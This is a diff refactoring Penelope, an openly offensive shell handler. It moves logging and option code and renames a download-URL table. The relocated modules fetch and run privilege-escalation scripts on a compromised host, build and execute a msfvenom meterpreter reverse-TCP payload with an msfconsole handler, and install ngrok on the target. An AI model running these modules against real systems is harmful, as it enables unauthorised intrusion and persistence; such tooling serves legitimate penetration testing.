@@ -61,53 +61,7 @@ from urllib.parse import unquote
 from configparser import ConfigParser
 from urllib.request import Request, urlopen
 
-if not sys.version_info >= (3, 6):
-	print("(!) Penelope requires Python version 3.6 or higher (!)")
-	sys.exit()
-
-class LineBuffer:
-	def __init__(self, length):
-		self.len = length
-		self.lines = deque(maxlen=self.len)
-
-	def __lshift__(self, data):
-		if isinstance(data, str):
-			data = data.encode()
-		if self.lines and not self.lines[-1].endswith(b'\n'):
-			current_partial = self.lines.pop()
-		else:
-			current_partial = b''
-		self.lines.extend((current_partial + data).splitlines(keepends=True))
-		return self
-
-	def __bytes__(self):
-		return b''.join(self.lines)
-
-def stdout(data, record=True):
-	sys.stdout.write(data)
-	sys.stdout.flush()
-	if record:
-		core.output_line_buffer << data.encode()
-
-def my_input(text=""):
-	text = "\r" + text
-	core.output_line_buffer << text.encode()
-	core.wait_input = True
-	response = original_input(text)
-	core.wait_input = False
-	return response
-original_input = input
-input = my_input
-
-TRACE_LEVEL_NUM = 25
-logging.addLevelName(TRACE_LEVEL_NUM, "TRACE")
-logging.TRACE = TRACE_LEVEL_NUM
-def trace(self, message, *args, **kwargs):
-    if self.isEnabledFor(TRACE_LEVEL_NUM):
-        self._log(TRACE_LEVEL_NUM, message, args, **kwargs)
-logging.Logger.trace = trace
 ################################## PYTHON MISSING BATTERIES ####################################
-
 from random import choice
 from string import ascii_letters
 rand = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
@@ -116,6 +70,13 @@ bdebug = lambda file, data: open("/tmp/" + file, "a").write(repr(data) + "\n")
 chunks = lambda string, length: (string[0 + i:length + i] for i in range(0, len(string), length))
 pathlink = lambda path: f'\x1b]8;;file://{path.parents[0]}\x07{path.parents[0]}{os.path.sep}\x1b]8;;\x07\x1b]8;;file://{path}\x07{path.name}\x1b]8;;\x07'
 normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
+
+def ask(text):
+	try:
+		return input(f"{paint(f'[?] {text}: ').yellow}")
+	except EOFError:
+		return ask(text)
+
 
 def Open(item, terminal=False):
 	if OS == 'Linux' and not DISPLAY:
@@ -150,11 +111,6 @@ def Open(item, terminal=False):
 			return False
 	return True
 
-def ask(text):
-	try:
-		return input(f"{paint(f'[?] {text}: ').yellow}")
-	except EOFError:
-		return ask(text)
 
 class Interfaces:
 
@@ -209,6 +165,7 @@ class Interfaces:
 	@property
 	def list_all(self):
 		return [item for item in list(self.list.keys()) + list(self.list.values())]
+
 
 class Table:
 
@@ -443,17 +400,21 @@ class paint:
 				self.colors.append(prefix + "8;5;" + str(__class__._colors[color.lower()]))
 		return self
 
+
 class CustomFormatter(logging.Formatter):
-	TEMPLATES = {
-		logging.CRITICAL: {'color':"RED",     'prefix':"[!!!]"},
-		logging.ERROR:    {'color':"red",     'prefix':"[-]"},
-		logging.WARNING:  {'color':"yellow",  'prefix':"[!]"},
-		logging.TRACE:    {'color':"cyan",    'prefix':"[•]"},
-		logging.INFO:     {'color':"green",   'prefix':"[+]"},
-		logging.DEBUG:    {'color':"magenta", 'prefix':"[DEBUG]"}
-	}
+	def __init__(self, *args, **kwargs):
+		super().__init__(*args, **kwargs)
+		self.templates = {
+			logging.CRITICAL: {'color':"RED",     'prefix':"[!!!]"},
+			logging.ERROR:    {'color':"red",     'prefix':"[-]"},
+			logging.WARNING:  {'color':"yellow",  'prefix':"[!]"},
+			logging.TRACE:    {'color':"cyan",    'prefix':"[•]"},
+			logging.INFO:     {'color':"green",   'prefix':"[+]"},
+			logging.DEBUG:    {'color':"magenta", 'prefix':"[DEBUG]"}
+		}
+
 	def format(self, record):
-		template = __class__.TEMPLATES[record.levelno]
+		template = self.templates[record.levelno]
 
 		thread = ""
 		if record.levelno is logging.DEBUG or options.debug:
@@ -472,6 +433,40 @@ class CustomFormatter(logging.Formatter):
 
 		text = f"{prefix}{template['prefix']}{thread} {logging.Formatter.format(self, record)}{suffix}"
 		return str(getattr(paint(text), template['color']))
+
+
+class LineBuffer:
+	def __init__(self, length):
+		self.len = length
+		self.lines = deque(maxlen=self.len)
+
+	def __lshift__(self, data):
+		if isinstance(data, str):
+			data = data.encode()
+		if self.lines and not self.lines[-1].endswith(b'\n'):
+			current_partial = self.lines.pop()
+		else:
+			current_partial = b''
+		self.lines.extend((current_partial + data).splitlines(keepends=True))
+		return self
+
+	def __bytes__(self):
+		return b''.join(self.lines)
+
+def stdout(data, record=True):
+	sys.stdout.write(data)
+	sys.stdout.flush()
+	if record:
+		core.output_line_buffer << data.encode()
+
+def my_input(text=""):
+	#text = "\r" + text
+	core.output_line_buffer << text.encode()
+	core.wait_input = True
+	response = original_input(text)
+	core.wait_input = False
+	return response
+
 
 class BetterCMD:
 	def __init__(self, prompt=None, banner=None):
@@ -1470,6 +1465,7 @@ class ControlQueue:
 			except queue.Empty:
 				break
 		os.read(self._out, amount)
+
 
 class Core:
 
@@ -2766,7 +2762,7 @@ class Session:
 					cmd = socat_cmd.format(_bin)
 				else:
 					logger.warning("Cannot upgrade shell with the available binaries...")
-					socat_binary = self.need_binary("socat", BINARIES['socat'])
+					socat_binary = self.need_binary("socat", URLS['socat'])
 					if socat_binary:
 						_bin = socat_binary
 						cmd = socat_cmd.format(_bin)
@@ -3548,7 +3544,7 @@ class Session:
 						logger.warning("ncat is not available on the target")
 						ncat_binary = self.need_binary(
 							"ncat",
-							BINARIES['ncat']
+							URLS['ncat']
 							)
 						if ncat_binary:
 							cmd = ncat_cmd.format(ncat_binary)
@@ -3758,112 +3754,6 @@ class Session:
 
 		return True
 
-
-BINARIES = {
-'linpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
-'winpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
-'socat':        "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
-'ncat':         "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
-'lse':          "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
-'powerup':      "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
-'deepce':       "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
-'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
-'les':          "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
-'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
-}
-
-
-class Module:
-	enabled = True
-	on_session_start = False
-	on_session_end = False
-
-class upload_privesc_scripts(Module):
-	def run(session):
-		"""
-		Upload a set of privilege escalation scripts to the target
-		"""
-		if session.OS == 'Unix':
-			session.upload(BINARIES['linpeas'])
-			session.upload(BINARIES['lse'])
-			session.upload(BINARIES['deepce'])
-
-		elif session.OS == 'Windows':
-			session.upload(BINARIES['winpeas'])
-			session.upload(BINARIES['powerup'])
-			session.upload(BINARIES['privesccheck'])
-
-class peass_ng(Module):
-	def run(session):
-		"""
-		Run the latest version of PEASS-ng in the background
-		"""
-		if session.OS == 'Unix':
-			session.script(BINARIES['linpeas'])
-		elif session.OS == 'Windows':
-			logger.error("This module runs only on Unix shells")
-
-class lse(Module):
-	def run(session):
-		"""
-		Run the latest version of linux-smart-enumeration in the background
-		"""
-		if session.OS == 'Unix':
-			session.script(BINARIES['lse'])
-		else:
-			logger.error("This module runs only on Unix shells")
-
-class meterpreter(Module):
-	def run(session):
-		"""
-		Get a meterpreter shell
-		"""
-		if session.OS == 'Unix':
-			logger.error("This module runs only on Windows shells")
-		else:
-			payload_path = f"/dev/shm/{rand(10)}.exe"
-			host = session._host
-			port = 5555
-			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
-			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
-
-			if result.returncode == 0:
-				logger.info("Payload created!")
-				uploaded_path = session.upload(payload_path)
-				if uploaded_path:
-					meterpreter_handler_cmd = (
-						f'msfconsole -x "use exploit/multi/handler; '
-						f'set payload windows/meterpreter/reverse_tcp; '
-						f'set LHOST {host}; set LPORT {port}; run"'
-					)
-					Open(meterpreter_handler_cmd, terminal=True)
-					print(meterpreter_handler_cmd)
-					session.exec(uploaded_path[0])
-			else:
-				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
-
-class ngrok(Module):
-	def run(session):
-		"""
-		Setup ngrok
-		"""
-		if session.OS == 'Unix':
-			session.upload(BINARIES['ngrok_linux'], remote_path=session.tmp)
-			session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C ~/.local/bin")
-			token = input("Authtoken: ")
-			session.exec(f"ngrok config add-authtoken {token}")
-		else:
-			logger.error("This module runs only on Unix shells")
-
-class linuxexploitsuggester(Module):
-	def run(session):
-		"""
-		Run the latest version of linux-exploit-suggester in the background
-		"""
-		if session.OS == 'Unix':
-			session.script(BINARIES['les'])
-		else:
-			logger.error("This module runs only on Unix shells")
 
 class Messenger:
 	SHELL = 1
@@ -4202,6 +4092,109 @@ def agent():
 	os.kill(os.getppid(), signal.SIGKILL) # TODO
 
 
+def modules():
+	return {module.__name__:module for module in Module.__subclasses__()}
+
+
+class Module:
+	enabled = True
+	on_session_start = False
+	on_session_end = False
+
+
+class upload_privesc_scripts(Module):
+	def run(session):
+		"""
+		Upload a set of privilege escalation scripts to the target
+		"""
+		if session.OS == 'Unix':
+			session.upload(URLS['linpeas'])
+			session.upload(URLS['lse'])
+			session.upload(URLS['deepce'])
+
+		elif session.OS == 'Windows':
+			session.upload(URLS['winpeas'])
+			session.upload(URLS['powerup'])
+			session.upload(URLS['privesccheck'])
+
+
+class peass_ng(Module):
+	def run(session):
+		"""
+		Run the latest version of PEASS-ng in the background
+		"""
+		if session.OS == 'Unix':
+			session.script(URLS['linpeas'])
+		elif session.OS == 'Windows':
+			logger.error("This module runs only on Unix shells")
+
+
+class lse(Module):
+	def run(session):
+		"""
+		Run the latest version of linux-smart-enumeration in the background
+		"""
+		if session.OS == 'Unix':
+			session.script(URLS['lse'])
+		else:
+			logger.error("This module runs only on Unix shells")
+
+
+class meterpreter(Module):
+	def run(session):
+		"""
+		Get a meterpreter shell
+		"""
+		if session.OS == 'Unix':
+			logger.error("This module runs only on Windows shells")
+		else:
+			payload_path = f"/dev/shm/{rand(10)}.exe"
+			host = session._host
+			port = 5555
+			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
+
+			if result.returncode == 0:
+				logger.info("Payload created!")
+				uploaded_path = session.upload(payload_path)
+				if uploaded_path:
+					meterpreter_handler_cmd = (
+						f'msfconsole -x "use exploit/multi/handler; '
+						f'set payload windows/meterpreter/reverse_tcp; '
+						f'set LHOST {host}; set LPORT {port}; run"'
+					)
+					Open(meterpreter_handler_cmd, terminal=True)
+					print(meterpreter_handler_cmd)
+					session.exec(uploaded_path[0])
+			else:
+				logger.error(f"Cannot create meterpreter payload: {result.stderr}")
+
+
+class ngrok(Module):
+	def run(session):
+		"""
+		Setup ngrok
+		"""
+		if session.OS == 'Unix':
+			session.upload(URLS['ngrok_linux'], remote_path=session.tmp)
+			session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C ~/.local/bin")
+			token = input("Authtoken: ")
+			session.exec(f"ngrok config add-authtoken {token}")
+		else:
+			logger.error("This module runs only on Unix shells")
+
+
+class linuxexploitsuggester(Module):
+	def run(session):
+		"""
+		Run the latest version of linux-exploit-suggester in the background
+		"""
+		if session.OS == 'Unix':
+			session.script(URLS['les'])
+		else:
+			logger.error("This module runs only on Unix shells")
+
+
 class FileServer:
 	def __init__(self, *items, port=None, host=None, password=None, quiet=False):
 		self.port = port or options.default_fileserver_port
@@ -4365,9 +4358,11 @@ class FileServer:
 			logger.warning(f"Shutting down Fileserver #{self.id}")
 		self.httpd.shutdown()
 
+
 def WinResize(num, stack):
 	if core.attached_session is not None and core.attached_session.type == "PTY":
 		core.attached_session.update_pty_size()
+
 
 def custom_excepthook(*args):
 	if len(args) == 1 and hasattr(args[0], 'exc_type'):
@@ -4381,160 +4376,6 @@ def custom_excepthook(*args):
 	print('─' * 80, f"\n{paint('Penelope version:').red} {paint(__version__).green}")
 	print(f"{paint('Python version:').red} {paint(sys.version).green}")
 	print(f"{paint('System:').red} {paint(platform.version()).green}\n")
-
-sys.excepthook = custom_excepthook
-threading.excepthook = custom_excepthook
-
-# CONSTANTS
-OS = platform.system()
-OSes = {'Unix':'🐧', 'Windows':'💻'}
-TTY_NORMAL = termios.tcgetattr(sys.stdin)
-DISPLAY = 'DISPLAY' in os.environ
-MAX_CMD_PROMPT_LEN = 335
-LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
-MESSENGER = inspect.getsource(Messenger)
-STREAM = inspect.getsource(Stream)
-AGENT = inspect.getsource(agent)
-
-# INITIALIZATION
-os.umask(0o007)
-#signal.signal(signal.SIGINT, ControlC)
-signal.signal(signal.SIGWINCH, WinResize)
-try:
-	import readline
-except ImportError:
-	readline = None
-
-
-# OPTIONS
-class Options:
-	log_levels = {"silent":'WARNING', "debug":'DEBUG'}
-
-	def __init__(self):
-		self.basedir = Path.home() / f'.{__program__}'
-		self.default_listener_port = 4444
-		self.default_interface = "0.0.0.0"
-		self.default_fileserver_port = 8000
-		self.hints = False
-		self.no_log = False
-		self.no_timestamps = False
-		self.no_colored_timestamps = False
-		self.max_maintain = 10
-		self.maintain = 1
-		self.single_session = False
-		self.no_attach = False
-		self.no_upgrade = False
-		self.debug = False
-		self.dev_mode = False
-		self.latency = .01
-		self.histlength = 2000
-		self.long_timeout = 60
-		self.short_timeout = 4
-		self.max_open_files = 5
-		self.verify_ssl_cert = True
-		self.proxy = ''
-		self.upload_chunk_size = 51200
-		self.download_chunk_size = 1048576
-		self.network_buffer_size = 16384
-		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
-		self.logfile = f"{__program__}.log"
-		self.debug_logfile = "debug.log"
-		self.cmd_histfile = 'cmd_history'
-		self.debug_histfile = 'cmd_debug_history'
-		self.useragent = "Wget/1.21.2"
-		self.attach_lines = 20
-
-	def __getattribute__(self, option):
-		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
-			return self.basedir / super().__getattribute__(option)
-#		if option == "basedir":
-#			return Path(super().__getattribute__(option))
-		return super().__getattribute__(option)
-
-	def __setattr__(self, option, value):
-		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
-		level = __class__.log_levels.get(option)
-
-		if level:
-			level = level if value else 'INFO'
-			logging.getLogger(__program__).setLevel(getattr(logging, level))
-
-		elif option == 'maintain':
-			if value > self.max_maintain:
-				show(f"Maintain value decreased to the max ({self.max_maintain})")
-				value = self.max_maintain
-			if value < 1:
-				value = 1
-			#if value == 1: show(f"Maintain value should be 2 or above")
-			if value > 1 and self.single_session:
-				show(f"Single Session mode disabled because Maintain is enabled")
-				self.single_session = False
-
-		elif option == 'single_session':
-			if self.maintain > 1 and value:
-				show(f"Single Session mode disabled because Maintain is enabled")
-				value = False
-
-		elif option == 'no_bins':
-			if value is None:
-				value = []
-			elif type(value) is str:
-				value = re.split('[^a-zA-Z0-9]+', value)
-
-		elif option == 'proxy':
-			if not value:
-				os.environ.pop('http_proxy', '')
-				os.environ.pop('https_proxy', '')
-			else:
-				os.environ['http_proxy'] = value
-				os.environ['https_proxy'] = value
-
-		elif option == 'basedir':
-			value.mkdir(parents=True, exist_ok=True)
-
-		if hasattr(self, option) and getattr(self, option) is not None:
-			new_value_type = type(value).__name__
-			orig_value_type = type(getattr(self, option)).__name__
-			if new_value_type == orig_value_type:
-				self.__dict__[option] = value
-			else:
-				show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
-		else:
-			self.__dict__[option] = value
-
-## DEFAULT OPTIONS
-options = Options()
-
-## LOGGERS
-stdout_handler = logging.StreamHandler()
-stdout_handler.setFormatter(CustomFormatter())
-stdout_handler.terminator = ''
-
-file_handler = logging.FileHandler(options.logfile)
-file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
-file_handler.setLevel('INFO') # ??? TODO
-file_handler.terminator = ''
-
-debug_file_handler = logging.FileHandler(options.debug_logfile)
-debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
-debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
-debug_file_handler.terminator = ''
-
-logger = logging.getLogger(__program__)
-logger.addHandler(stdout_handler)
-logger.addHandler(file_handler)
-logger.addHandler(debug_file_handler)
-
-cmdlogger = logging.getLogger(f"{__program__}_cmd")
-cmdlogger.setLevel(logging.INFO)
-cmdlogger.addHandler(stdout_handler)
-
-if options.dev_mode:
-	#stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
-	#logger.setLevel('DEBUG')
-	#options.max_maintain = 50
-	#options.no_bins = 'python,python3,script'
-	pass
 
 def get_glob_size(_glob, block_size):
 	from glob import glob
@@ -4661,9 +4502,6 @@ def listener_menu():
 	listener_menu.finishing.set()
 	return True
 
-def modules():
-	return {module.__name__:module for module in Module.__subclasses__()}
-
 def load_rc():
 	RC = Path(options.basedir / "peneloperc")
 	try:
@@ -4672,8 +4510,6 @@ def load_rc():
 	except FileNotFoundError:
 		RC.touch()
 	os.chmod(RC, 0o600)
-
-load_rc()
 
 def fonts_installed():
 	if os.path.isfile("/usr/share/fonts/truetype/noto/NotoColorEmoji.ttf"):
@@ -4689,17 +4525,105 @@ def fonts_installed():
 		pass
 	return False
 
-if not fonts_installed():
-	logger.warning("For showing emojis please install 'fonts-noto-color-emoji'")
+# OPTIONS
+class Options:
+	log_levels = {"silent":'WARNING', "debug":'DEBUG'}
 
-## CREATE BASIC OBJECTS
-core = Core()
-menu = MainMenu()
-start = menu.start
+	def __init__(self):
+		self.basedir = Path.home() / f'.{__program__}'
+		self.default_listener_port = 4444
+		self.default_interface = "0.0.0.0"
+		self.default_fileserver_port = 8000
+		self.hints = False
+		self.no_log = False
+		self.no_timestamps = False
+		self.no_colored_timestamps = False
+		self.max_maintain = 10
+		self.maintain = 1
+		self.single_session = False
+		self.no_attach = False
+		self.no_upgrade = False
+		self.debug = False
+		self.dev_mode = False
+		self.latency = .01
+		self.histlength = 2000
+		self.long_timeout = 60
+		self.short_timeout = 4
+		self.max_open_files = 5
+		self.verify_ssl_cert = True
+		self.proxy = ''
+		self.upload_chunk_size = 51200
+		self.download_chunk_size = 1048576
+		self.network_buffer_size = 16384
+		self.escape = {'sequence':b'\x1b[24~', 'key':'F12'}
+		self.logfile = f"{__program__}.log"
+		self.debug_logfile = "debug.log"
+		self.cmd_histfile = 'cmd_history'
+		self.debug_histfile = 'cmd_debug_history'
+		self.useragent = "Wget/1.21.2"
+		self.attach_lines = 20
+
+	def __getattribute__(self, option):
+		if option in ("logfile", "debug_logfile", "cmd_histfile", "debug_histfile"):
+			return self.basedir / super().__getattribute__(option)
+#		if option == "basedir":
+#			return Path(super().__getattribute__(option))
+		return super().__getattribute__(option)
+
+	def __setattr__(self, option, value):
+		show = logger.error if 'logger' in globals() else lambda x: print(paint(x).red)
+		level = __class__.log_levels.get(option)
+
+		if level:
+			level = level if value else 'INFO'
+			logging.getLogger(__program__).setLevel(getattr(logging, level))
+
+		elif option == 'maintain':
+			if value > self.max_maintain:
+				show(f"Maintain value decreased to the max ({self.max_maintain})")
+				value = self.max_maintain
+			if value < 1:
+				value = 1
+			#if value == 1: show(f"Maintain value should be 2 or above")
+			if value > 1 and self.single_session:
+				show(f"Single Session mode disabled because Maintain is enabled")
+				self.single_session = False
+
+		elif option == 'single_session':
+			if self.maintain > 1 and value:
+				show(f"Single Session mode disabled because Maintain is enabled")
+				value = False
+
+		elif option == 'no_bins':
+			if value is None:
+				value = []
+			elif type(value) is str:
+				value = re.split('[^a-zA-Z0-9]+', value)
+
+		elif option == 'proxy':
+			if not value:
+				os.environ.pop('http_proxy', '')
+				os.environ.pop('https_proxy', '')
+			else:
+				os.environ['http_proxy'] = value
+				os.environ['https_proxy'] = value
+
+		elif option == 'basedir':
+			value.mkdir(parents=True, exist_ok=True)
+
+		if hasattr(self, option) and getattr(self, option) is not None:
+			new_value_type = type(value).__name__
+			orig_value_type = type(getattr(self, option)).__name__
+			if new_value_type == orig_value_type:
+				self.__dict__[option] = value
+			else:
+				show(f"Wrong value type for '{option}': Expect <{orig_value_type}>, not <{new_value_type}>")
+		else:
+			self.__dict__[option] = value
 
 def main():
 
-	## COMMAND LINE OPTIONS
+	## Command line options
 	from argparse import ArgumentParser
 	parser = ArgumentParser(description="Penelope Shell Handler", add_help=False)
 
@@ -4738,6 +4662,14 @@ def main():
 	debug.add_argument("-dd", "--dev-mode", help="Developer mode", action="store_true")
 
 	parser.parse_args(None, options)
+
+	# Modify objects for testing
+	if options.dev_mode:
+		logger.critical("(!) THIS IS DEVELOPER MODE (!)")
+		#stdout_handler.addFilter(lambda record: True if record.levelno != logging.DEBUG else False)
+		#logger.setLevel('DEBUG')
+		#options.max_maintain = 50
+		#options.no_bins = 'python,python3,script'
 
 	original_handler = signal.signal(signal.SIGINT, lambda num, stack: core.stop())
 
@@ -4782,6 +4714,101 @@ def main():
 	listener_menu()
 	signal.signal(signal.SIGINT, original_handler)
 	return True
+
+
+#################### PROGRAM LOGIC ####################
+
+# Check Python version
+if not sys.version_info >= (3, 6):
+	print("(!) Penelope requires Python version 3.6 or higher (!)")
+	sys.exit()
+
+# Apply default options
+options = Options()
+
+# Loggers
+## Add TRACE logging level
+TRACE_LEVEL_NUM = 25
+logging.addLevelName(TRACE_LEVEL_NUM, "TRACE")
+logging.TRACE = TRACE_LEVEL_NUM
+def trace(self, message, *args, **kwargs):
+    if self.isEnabledFor(TRACE_LEVEL_NUM):
+        self._log(TRACE_LEVEL_NUM, message, args, **kwargs)
+logging.Logger.trace = trace
+
+## Setup Logging Handlers
+stdout_handler = logging.StreamHandler()
+stdout_handler.setFormatter(CustomFormatter())
+stdout_handler.terminator = ''
+
+file_handler = logging.FileHandler(options.logfile)
+file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s", "%Y-%m-%d %H:%M:%S"))
+file_handler.setLevel('INFO') # ??? TODO
+file_handler.terminator = ''
+
+debug_file_handler = logging.FileHandler(options.debug_logfile)
+debug_file_handler.setFormatter(CustomFormatter("%(asctime)s %(message)s"))
+debug_file_handler.addFilter(lambda record: True if record.levelno == logging.DEBUG else False)
+debug_file_handler.terminator = ''
+
+## Initialize Loggers
+logger = logging.getLogger(__program__)
+logger.addHandler(stdout_handler)
+logger.addHandler(file_handler)
+logger.addHandler(debug_file_handler)
+
+cmdlogger = logging.getLogger(f"{__program__}_cmd")
+cmdlogger.setLevel(logging.INFO)
+cmdlogger.addHandler(stdout_handler)
+
+# Set constants
+OS = platform.system()
+OSes = {'Unix':'🐧', 'Windows':'💻'}
+TTY_NORMAL = termios.tcgetattr(sys.stdin)
+DISPLAY = 'DISPLAY' in os.environ
+MAX_CMD_PROMPT_LEN = 335
+LINUX_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+URLS = {
+	'linpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh",
+	'winpeas':      "https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat",
+	'socat':        "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/socat",
+	'ncat':         "https://raw.githubusercontent.com/andrew-d/static-binaries/master/binaries/linux/x86_64/ncat",
+	'lse':          "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh",
+	'powerup':      "https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1",
+	'deepce':       "https://raw.githubusercontent.com/stealthcopter/deepce/refs/heads/main/deepce.sh",
+	'privesccheck': "https://raw.githubusercontent.com/itm4n/PrivescCheck/refs/heads/master/PrivescCheck.ps1",
+	'les':          "https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/refs/heads/master/linux-exploit-suggester.sh",
+	'ngrok_linux':  "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz",
+}
+
+# Python Agent code
+MESSENGER = inspect.getsource(Messenger)
+STREAM = inspect.getsource(Stream)
+AGENT = inspect.getsource(agent)
+
+# Engine initialization
+original_input = input
+input = my_input
+sys.excepthook = custom_excepthook
+threading.excepthook = custom_excepthook
+os.umask(0o007)
+signal.signal(signal.SIGWINCH, WinResize)
+try:
+	import readline
+except ImportError:
+	readline = None
+
+## Create basic objects
+core = Core()
+menu = MainMenu()
+start = menu.start
+
+# Check for installed emojis
+if not fonts_installed():
+	logger.warning("For showing emojis please install 'fonts-noto-color-emoji'")
+
+# Load peneloperc
+load_rc()
 
 if __name__ == "__main__":
 	if main():
